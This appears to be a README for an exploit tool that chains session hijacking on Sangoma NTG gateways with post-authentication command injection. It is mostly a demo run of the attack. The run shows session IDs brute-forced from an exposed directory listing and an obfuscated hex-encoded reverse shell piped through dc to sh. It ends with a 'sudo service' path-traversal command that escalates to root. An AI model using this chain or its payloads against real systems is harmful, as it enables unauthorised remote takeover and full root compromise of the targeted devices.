# sangoma-ntg-hijack-rce
Sangoma NTG Session Hijack + Post-Auth RCE Chain.

Uses a directory listing to get a session hijacking and then uses the previous post-auth RCE to pop a shell. 

Demo:
```
(venv) darren@Darrens-MacBook-Pro sangomas % python3 ntg-hijacker-rce.py http://192.168.0.41:81 192.168.0.55 6666
/Users/darren/projects/sangomas/ntg-hijacker-rce.py:3: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  import telnetlib
[*] Using 192.168.0.55:6666 for connectback...
[+] starting handler on port 6666
[+] Attempting to list the sessions directory...
[*] Found some sessions...
[*] Got 85 sessions to try...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[-] Invalid, next...
[+] Attempting to log into NTG...
[*] Logged in?
[+] Got what looks to be a valid session...
[+] Well, we made it this far...
7f289b0bb3ab79e2c24a229acac814d1
[*] We made it this far and seem to have a valid session...
echo '16i 6E6F6875702062617368202D63202762617368202D69203E26202F6465762F7463702F3139322E3136382E302E35352F3636363620303E2631202627 P' | dc | sh
[+] Doing the command injection...
[*] Trying to pop a shell...
[*] Got connection from 192.168.0.41
[$] Shell popped :P
[*] Trying to pop a shell...
bash: no job control in this shell
bash-3.2$ [*] Trying to pop a shell...


bash-3.2$ id;uname -a;pwd
id;uname -a;pwd
uid=101(webconfig) gid=102(webconfig) groups=102(webconfig)
Linux sangomantg.netborder.lan 2.6.39-4.sng2 #1 SMP Wed Dec 21 17:26:48 EST 2011 i686 i686 i386 GNU/Linux
/var/webconfig/htdocs/admin
bash-3.2$ sudo service ../../../../bin/sh
sudo service ../../../../bin/sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

```
